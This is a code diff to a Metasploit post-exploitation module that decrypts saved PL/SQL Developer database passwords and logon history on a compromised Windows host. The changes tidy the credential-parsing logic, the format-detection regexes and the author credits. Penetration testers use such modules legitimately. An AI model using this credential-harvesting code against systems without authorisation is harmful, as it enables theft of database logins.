@@ -21,8 +21,8 @@ class MetasploitModule < Msf::Post
           [ 'URL', 'https://adamcaudill.com/2016/02/02/plsql-developer-nonexistent-encryption/']
         ],
         'Author' => [
-          'Adam Caudill', # Discovery
-          'Jemmy Wang' # msf module
+          'Adam Caudill', # Discovery of legacy decryption algorithm
+          'Jemmy Wang' # Msf module & Discovery of AES decryption algorithm
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Post
     return result
   end
 
-  # New encryption algorithm introduced since PL/SQL Developer 15.0
+  # New AES encryption algorithm introduced since PL/SQL Developer 15.0
   def decrypt_str_aes(str)
     bytes = Rex::Text.decode_base64(str)
 
@@ -78,10 +78,10 @@ class MetasploitModule < Msf::Post
       return ''
     end
 
-    if str.match(/^\d{8,}$/) && str.length % 4 == 0
+    if str.match(/^(\d{4})+$/)
       return decrypt_str_legacy(str) # Legacy encryption
-    elsif str.match(/^X\.[A-Za-z0-9+]+={0,2}$/)
-      return decrypt_str_aes(str[2..]) # New aes encryption
+    elsif str.match(%r{^X\.([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$})
+      return decrypt_str_aes(str[2..]) # New AES encryption
     end
 
     # Shouldn't reach here
@@ -91,7 +91,9 @@ class MetasploitModule < Msf::Post
 
   # Parse and separate the history string
   def parse_history(str)
-    result = { DisplayName: '', Username: '', Database: '', ConnectAs: '', Password: '', Parent: '-1' }
+    # @keys is defined in decrypt_pref, and this function is called by decrypt_pref after @keys is defined
+    result = Hash[@keys.map { |k| [k.to_sym, ''] }]
+    result[:Parent] = '-2'
 
     if str.end_with?(' AS SYSDBA')
       result[:ConnectAs] = 'SYSDBA'
@@ -140,9 +142,9 @@ class MetasploitModule < Msf::Post
     connections_section = false
 
     # Keys that we care about
-    keys = %w[DisplayName Number Parent IsFolder Username Database ConnectAs Password]
+    @keys = %w[DisplayName Number Parent IsFolder Username Database ConnectAs Password]
     # Initialize obj with empty values
-    obj = Hash[keys.map { |k| [k.to_sym, ''] }]
+    obj = Hash[@keys.map { |k| [k.to_sym, ''] }]
     # Folder parent objects
     folders = {}
 
@@ -191,7 +193,7 @@ class MetasploitModule < Msf::Post
           end
 
           # Reset obj
-          obj = Hash[keys.map { |k| [k.to_sym, ''] }]
+          obj = Hash[@keys.map { |k| [k.to_sym, ''] }]
         end
 
       end
@@ -200,13 +202,19 @@ class MetasploitModule < Msf::Post
     # Build display name (Add parent folder name to the beginning of the display name)
     result.each do |item|
       pitem = item
-      while pitem[:Parent] != '-1'
+      while pitem[:Parent] != '-1' && pitem[:Parent] != '-2'
         pitem = folders[pitem[:Parent]]
         if pitem.nil?
           print_error("Invalid parent: #{item[:Parent]}")
           break
         end
         item[:DisplayName] = pitem[:DisplayName] + '/' + item[:DisplayName]
+      end
+
+      if item[:Parent] == '-2'
+        item[:DisplayName] = '[LogonHistory]' + item[:DisplayName]
+      else
+        item[:DisplayName] = '[Connections]/' + item[:DisplayName]
       end
 
       # Remove fields used to build the display name
